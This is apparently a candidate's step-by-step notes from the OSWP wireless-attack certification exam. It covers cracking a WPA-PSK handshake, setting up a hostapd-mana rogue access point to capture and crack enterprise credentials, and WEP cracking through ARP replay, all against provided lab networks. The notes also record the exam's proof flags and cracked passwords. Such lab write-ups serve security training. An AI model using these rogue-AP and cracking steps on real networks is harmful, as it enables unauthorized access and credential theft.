# Pretest Checks
Started at 2:35
## System Info Dump Script
```$output = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess, @{n='ProcessName';e={(Get-Process -Id $_.OwningProcess).ProcessName}} | format-table
$output += Get-Process
$output += Get-WmiObject -Class Win32_product | format-table
$output += Get-WmiObject -Class win32_physicalmemory | format-table
$output += Get-WmiObject Win32_VideoController
$output += systeminfo | format-table
$output += Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
Write-Output $output |clip
Write-Host "Data Copied to your clipboard, please paste this data in a new paste at paste.offse.com (don't copy the url!)" -ForegroundColor Green
```
## Outputs
[https://paste.offsec.com/?4181151242c148e7#floLKYv8GFcaGD8BcnRfBuXmwsM8Krq4iLYBkhQ5GAw=](https://paste.offsec.com/?4181151242c148e7#floLKYv8GFcaGD8BcnRfBuXmwsM8Krq4iLYBkhQ5GAw=)

Rerun (Anydesk seemed to have popped up)
[https://paste.offsec.com/?9543f267bd37849c#iG+J19viTLtAgaEkrM8MlMUf1AfoqUdIkYvGMAwUB+w=](https://paste.offsec.com/?9543f267bd37849c#iG+J19viTLtAgaEkrM8MlMUf1AfoqUdIkYvGMAwUB+w=)

Currently 3:05
Ran again due to teamviewer and anydesk's existence but not running
![[Pasted image 20230909030927.png]]
[https://paste.offsec.com/?643c2b5eeb415c35#0T4MACqESjWd6TrwlTunQpObm3Ya/qAT4wPa/9+QYCg=](https://paste.offsec.com/?643c2b5eeb415c35#0T4MACqESjWd6TrwlTunQpObm3Ya/qAT4wPa/9+QYCg=)

Finally ready to proceed at 3:10

# Exam Start
The Offensive Security Wireless Attacks OSWP certification exam contains a collection of three (3) scenarios with different ESSIDs designed to be attacked. 

Your assigned machine IP address is 192.168.54.24 .

Your goal is to obtain access to two (2) out of three (3) scenarios. 
**You must gain proof.txt in the WPA-MGT scenario (mandatory)**, and either the WEP or WPA-PSK scenario in order to pass the OSWP certification exam. 

Proof of access must be shown by connecting to the network and obtaining the proof file found on http://192.168.1.1/proof.txt.
Take note that the network manager is disabled in the Graphical User Interface (GUI) and students are expected to use the command-line interface (CLI) to connect to the Access Point to read the required proof file.
Please note that certain exam challenges may require some additional research with regard to which tools to use to complete the exam objectives. 

All attacks must be performed on the provided Kali machine. You may log in to the Kali machine via SSH on port 22 or RDP on port 3389 using the username "kali" and the password "kali"
Should you require RDP to the machine, we highly recommend using the following command for a better experience: xfreerdp /compression +auto-reconnect /u:kali /p:kali /v:192.168.54.24 +clipboard
Each scenario uses its own unique Kali machines and reverts will revert the Kali machine as well. When a new scenario is started or reverted, your Kali machine will be wiped as well.

Please note that only one scenario runs at a time. 
The WPA-PSK scenario is active by default, you can select the desired scenario you wish to work on in the dropdown menu below.

Note that starting/reverting a scenario can take an estimated two to four (2-4) minutes.

The Kali machine is behind a NAT and the following ports are exposed through the NAT:
22 (Used for SSH)
80 (Available)
443 (Available)
666 (Available)
2501  (Available)
3128 (Available)
3389 (Used for RDP)
8080 (Available)
8083 (Available)
8443 (Available)
8880 (Available)

The use of automated tools like wifite, wifiphisher, and similar are not allowed.
![[Pasted image 20230909231437.png]]

# WPA-PSK
![[Pasted image 20230909031541.png]]
Machine name ***alexandria***

## Interfaces
```
┌──(kali㉿alexandria)-[~]
└─$ sudo airmon-ng

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these four things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.
    #4) "Be excellent to each other.", Bill & Ted

[sudo] password for kali:

PHY     Interface       Driver          Chipset

phy0    wlan0           mt76x2u         MediaTek Inc. MT7612U 802.11a/b/g/n/ac
```

### Start Mon Mode
```
┌──(kali㉿alexandria)-[~]
└─$ sudo airmon-ng start wlan0


PHY     Interface       Driver          Chipset

phy0    wlan0           mt76x2u         MediaTek Inc. MT7612U 802.11a/b/g/n/ac
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

First capture with no specified channel
```
sudo airodump-ng wlan0mon
```
![[Pasted image 20230909031832.png]]
Redo with channel specification and output file
```
sudo airodump-ng wlan0mon -c -w Mouseion
```
![[Pasted image 20230909031956.png]]
Now to deauth the client station for reassociation for the handshake capture before bruteforcing the PSK

...Oh it already captured the handshake

Now to prep the bruteforce of the captured handshake with the wordlist and start the crack

```
┌──(kali㉿alexandria)-[~]
└─$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz

┌──(kali㉿alexandria)-[~]
└─$ sudo aircrack-ng Mouseion-01.cap -w /usr/share/wordlists/rockyou.txt
```

Cracked Successfully
![[Pasted image 20230909032441.png]]
PSK: **1q2w3e4r**
## Manual Wi-Fi Connection
Since the test disables GUI connect and has me manually do it then I'll use wpa_supplicant to connect

Format of the wpa_supplicant.conf file for this SSID is:
```
network={
        ssid="Mouseion"
        scan_ssid=1
        key_mgmt=WPA-PSK
        psk="1q2w3e4r"
}
```

Turn off monitor mode on wlan0mon and rerun airmon-ng to confirm
![[Pasted image 20230909033018.png]]

Now to connect and get an IP address

```
sudo wpa_supplicant -i wlan0 -c wpa_supplicant.conf -B
```
Error when running the command
```
┌──(kali㉿alexandria)-[~]
└─$ sudo wpa_supplicant -i wlan0 -c wpa_supplicant.conf -B
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
```

```
sudo dhclient wlan0
```
Output errors
```
┌──(kali㉿alexandria)-[~]
└─$ sudo dhclient wlan0
invoke-rc.d: could not determine current runlevel
invoke-rc.d: policy-rc.d denied execution of reload.
mv: cannot move '/etc/resolv.conf.dhclient-new.405' to '/etc/resolv.conf': Device or resource busy
```

Check if it connected anyways
```
┌──(kali㉿alexandria)-[~]
└─$ iw wlan0 link
Connected to 02:13:37:be:ef:03 (on wlan0)
        SSID: Mouseion
        freq: 2427
        RX: 289159 bytes (4031 packets)
        TX: 1834 bytes (13 packets)
        signal: -30 dBm
        rx bitrate: 12.0 MBit/s
        tx bitrate: 5.5 MBit/s

        bss flags:      short-slot-time
        dtim period:    2
        beacon int:     100
```

Then ping to check http://192.168.1.1

```
┌──(kali㉿alexandria)-[~]
└─$ ping 192.168.1.1
PING 192.168.1.1 (192.168.1.1) 56(84) bytes of data.
64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=0.144 ms
64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=0.156 ms
64 bytes from 192.168.1.1: icmp_seq=3 ttl=64 time=0.164 ms
64 bytes from 192.168.1.1: icmp_seq=4 ttl=64 time=0.154 ms
^C
--- 192.168.1.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3052ms
rtt min/avg/max/mdev = 0.144/0.154/0.164/0.007 ms
```

## The flag
get the flag at the proof.txt resource location

wget http://192.168.1.1/proof.txt
![[Pasted image 20230909033537.png]]
Flag:** 7d35ccfd3797b54d21fd3630279c00cc**
# WPA-MGT

Connection into "xanth"
```
PS C:\Users\prestonzen> ssh kali@192.168.54.24
kali@192.168.54.24's password:
┌──(kali㉿xanth)-[~]
└─$
```

Started monitor mode & ran airodump

```
sudo airmon-ng start wlan0
```

```
sudo airmon-ng start wlan0
```

Found Roogna on channel 11. Also pressed "a" to show all details
![[Pasted image 20230909033958.png]]

Rerun with file save and focus on channel 11

A deauth and crack may be worth a shot

BSSID of Roogna: 02:13:37:BE:EF:03 (Right click to paste in PowerShell)

Seems to have caught the handshake
![[Pasted image 20230909034306.png]]

Running Aircrack on handshake in the meantime while I hit the users and their passwords
![[Pasted image 20230909034419.png]]

Article from my notes on cracking wifi enterprise
https://medium.com/@navkang/hacking-wpa-enterprise-using-hostapd-b0fa8839943d

Prep hosts.conf (remove whitespaces)
```
interface=wlan0  
ssid=Roogna  
channel=11  
hw_mode=g

wpa=3  
wpa_key_mgmt=WPA-EAP  
wpa_pairwise=TKIP CCMP  
auth_algs=3

ieee8021x=1  
eapol_key_index_workaround=0  
eap_server=1  
eap_user_file=hostapd.eap_user  
eapol_key_index_workaround=0  
ca_cert=ca.pem  
server_cert=server.pem  
private_key=server.key  
private_key_passwd=  
dh_file=dhparam.pem  
mana_wpe=1 : enables WPE mode for EAP credentials interception  
mana_eapsuccess=1 : enable EAP success messages
```

Prep hostapd.eap_user file
```
* PEAP,TTLS,TLS,MD5,GTC
"t" TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP "1234test" [2]
```

Now prep all authentication files (https://github.com/sensepost/hostapd-mana/wiki/Creating-PSK-or-EAP-Networks)

```
openssl genrsa -out server.key 2048
```

```
openssl req -new -sha256 -key server.key -out csr.csr
```

```
openssl req -x509 -sha256 -days 365 -key server.key -in csr.csr -out server.pem
```

```
ln -s server.pem ca.pem
```

```
openssl dhparam 2048 > dhparam.pem
```

Directory contents after creating all required authentication files
![[Pasted image 20230909035808.png]]

Make sure to stop wlan0mon


Now to run hostapd-mana

![[Pasted image 20230909040921.png]]

No data

Trying a PMKID attack as I saw this note - [Wi-Fi Hacking, Part 11: The PMKID Attack (hackers-arise.com)](https://www.hackers-arise.com/post/wi-fi-hacking-part-11-the-pmkid-attack)

![[Pasted image 20230909041444.png]]
BSSID                    STATION               PWR     Rate    Lost    Frames  Notes  Probes
02:13:37:BE:EF:03  16:1B:5D:21:EA:EA  -29   36 -24      0       43  PMKID  Roogna
02:13:37:BE:EF:03  26:8C:FA:42:D2:99  -29    6 -18      0      198  PMKID  Roogna

Test command
```
hcxdumptool -i wlan0mon -o RoognaPMKID --enable_status=1 --filterlist_ap=target02:13:37:BE:EF:03 --filtermode=2 -c 2
```

Dead End

RDP Wireshark is horribly lagy

![[Pasted image 20230909043828.png]]

![[Pasted image 20230909044021.png]]

Now to make a certificate that looks the same
![[Pasted image 20230909044534.png]]

They're authenticating

![[Pasted image 20230909044842.png]]

## Cracking
Saving John the ripper passwords

iris:$NETNTLM$2c32c5f41faf476e$501ff787ea7e47ce3a06d7b84f5ad2cd1f429e70a570ad07:::::::
```
MANA EAP Identity Phase 1: Castle\iris
iris:$NETNTLM$2c32c5f41faf476e$501ff787ea7e47ce3a06d7b84f5ad2cd1f429e70a570ad07:::::::
```

Saved hash to hash.txt the ran john
![[Pasted image 20230909045142.png]]

Her password is **patricia**

## Connection
[wifi - Connecting to enterprise network wpa_supplicant - Raspberry Pi Stack Exchange](https://raspberrypi.stackexchange.com/questions/45618/connecting-to-enterprise-network-wpa-supplicant)
wpa_supplicant.conf file contents
```
network={
        ssid="Roogna"
        scan_ssid=1
        key_mgmt=WPA-EAP
        identity="Castle\iris"
        password="patricia"
        eap=PEAP
        phase2="auth=MSCHAPV2"
}
```


Check connection
```
iw wlan0 link
```
![[Pasted image 20230909051155.png]]

```
sudo dhclient wlan0
```

Ignore the error
![[Pasted image 20230909051304.png]]

Download hash
![[Pasted image 20230909051248.png]]
Grab the flag
```
wget http://192.168.1.1/proof.txt
cat proof.txt
```
![[Pasted image 20230909051421.png]]
Hash: 3b9a7b0467b37b7282d660aeaf5ef022
# WEP
## Initial Connection
![[Pasted image 20230909051755.png]]
## Setup

Monitor mode plus channel refinement plus logging to a file
![[Pasted image 20230909051856.png]]

```
sudo airodump-ng wlan0mon -c 3 -w Room101
```
![[Pasted image 20230909051956.png]]
Resource: [simple_wep_crack [Aircrack-ng]](https://www.aircrack-ng.org/doku.php?id=simple_wep_crack#:~:text=Start%20the%20wireless%20interface%20in%20monitor%20mode%20on,in%20ARP%20request%20replay%20mode%20to%20inject%20packets)
First see if I can associate with the Access Point

```
 sudo aireplay-ng -1 0 -e Room101 -a 02:13:37:BE:EF:03 -h 00:11:22:33:44:55 wlan0mon
```

Association successful
![[Pasted image 20230909052334.png]]
My MAC appears as well as an acknowledgement (I pressed a to show all stations, clients, and acknowledgements
![[Pasted image 20230909052430.png]]

Now to create more IV's for WEP with aireplay-ng
```
sudo aireplay-ng -3 -b 02:13:37:BE:EF:03 -h 00:11:22:33:44:55 wlan0mon
```

![[Pasted image 20230909052820.png]]
Note that it has the 0 ARP request issue.

I want over 9000 Beacons to improve success rates
![[Pasted image 20230909052851.png]]

Perfect I got the ARP request
![[Pasted image 20230909053047.png]]

For good measure I'll redo with the MAC of the already associated client
MAC: 02:00:00:00:03:00

```
sudo aireplay-ng -1 0 -e Room101 -a 02:13:37:BE:EF:03 -h 02:00:00:00:03:00 wlan0mon
```

```
sudo aireplay-ng -3 -b 02:13:37:BE:EF:03 -h 02:00:00:00:03:00 wlan0mon
```

Looking for more ways to increase the IV's. Am cracking simultaneously to continue to check the IV's and for some reason I only have under 250

...Something happened and there are tons of ARP requests
![[Pasted image 20230909053958.png]]
## Cracking
I can now start cracking the .cap file.

```
sudo aircrack-ng Room101-01.cap
```
![[Pasted image 20230909054032.png]]

Key: **2E:2C:F0:E3:FF**

## Connection

Stop monitor mode

```
sudo iwconfig wlan0 essid Room101 key 2E:2C:F0:E3:FF
```

```
sudo dhclient wlan0
```

![[Pasted image 20230909054157.png]]

Check connection
```
iw wlan0 link
```

![[Pasted image 20230909054219.png]]

## Flag
Go for the flag
![[Pasted image 20230909054253.png]]

Hash: **fe9737f77454306264959e73f2e556a2**

# Summary
All hashes obtained
![[Pasted image 20230909231451.png]]
![[Pasted image 20230909054402.png]]